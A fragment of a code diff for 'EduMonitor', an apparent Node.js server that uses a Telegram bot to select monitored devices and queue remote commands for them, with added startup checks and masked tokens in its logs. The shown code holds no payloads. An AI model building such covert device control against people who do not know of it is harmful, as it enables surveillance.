+                    await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
+                    await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`);
+                }
+            } else if (data === 'close_menu') {
+                await editMessageKeyboard(chatId, messageId, []);
+                await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
+            } else {
+                console.log(`⚠️ Unknown callback: ${data}`);
+            }
+            break;
+    }
+}
+
+async function executeCommandFromButton(chatId, messageId, command, callbackId) {
+    console.log(`🎯 Executing command from button: ${command}`);
+    
+    const selectedDeviceId = userDeviceSelection.get(chatId);
+    const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+    
+    if (!device) {
+        await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+        return;
+    }
+    
+    await answerCallbackQuery(callbackId, `🔄 Executing ${command}...`);
+    
+    if (!device.pendingCommands) {
+        device.pendingCommands = [];
+    }
+    
+    device.pendingCommands.push({
+        command: command,
+        originalCommand: `/${command}`,
+        messageId: messageId,
+        timestamp: Date.now()
+    });
+    await saveDevices();
+    
+    await sendTelegramMessage(chatId, `✅ Command sent: /${command}`);
+    
+    const keyboard = [[{ text: '◀️ Back to Menu', callback_data: 'help_main' }]];
+    await editMessageKeyboard(chatId, messageId, keyboard);
+}
+
 // ============= START SERVER =============
 
 async function startServer() {
-    console.log('🚀 Starting EduMonitor Server with GitHub Gist Storage...');
+    console.log('🚀 Starting EduMonitor Server with Secure Configuration...');
+    
+    // Check for required environment variables
+    if (!MAIN_BOT_TOKEN) {
+        console.error('❌ MAIN_BOT_TOKEN is required!');
+        process.exit(1);
+    }
+    
+    if (authorizedChats.size === 0) {
+        console.error('❌ AUTHORIZED_CHAT_IDS is required!');
+        process.exit(1);
+    }
+    
+    console.log('✅ Environment variables loaded successfully');
     
     // Check GitHub configuration
     if (!GITHUB_TOKEN) {
@@ -2173,17 +2178,20 @@ async function startServer() {
     app.listen(PORT, '0.0.0.0', () => {
         const serverIP = getServerIP();
         console.log('\n🚀 ===============================================');
-        console.log(`🚀 EduMonitor Server v8.0 - GitHub Gist Storage`);
+        console.log(`🚀 EduMonitor Server v8.0 - SECURE EDITION`);
         console.log(`🚀 Server IP: ${serverIP}`);
         console.log(`🚀 Port: ${PORT}`);
         console.log(`🚀 Webhook URL: ${activeServerUrl}/webhook`);
-        console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
+        console.log(`🚀 Authorized chats: ${authorizedChats.size} configured`);
         console.log(`\n💾 STORAGE STATUS:`);
         console.log(`   GitHub Gist: ${octokit ? '✅ Connected' : '❌ Not configured'}`);
         console.log(`   Gist ID: ${GIST_ID || '❌ Not set'}`);
         console.log(`   Local Backup: ✅ Active`);
+        console.log(`\n🔐 SECURITY:`);
+        console.log(`   Encryption: ${ENCRYPTION_SALT ? '✅ Enabled' : '⚠️ Using default'}`);
+        console.log(`   Admin Auth: ${process.env.ADMIN_USERNAME && process.env.ADMIN_PASSWORD ? '✅ Configured' : '❌ Not configured'}`);
         console.log(`\n🔄 FAILOVER STATUS:`);
-        console.log(`   Active Bot Token: ${activeBotToken.substring(0, 20)}...`);
+        console.log(`   Active Bot Token: ${activeBotToken.substring(0, 10)}...[HIDDEN]`);
         console.log(`   Active Server URL: ${activeServerUrl}`);
         console.log(`   Failover Active: ${failoverState.isFailedOver ? 'YES' : 'NO'}`);
         console.log(`   Failover Count: ${failoverState.failoverCount}`);
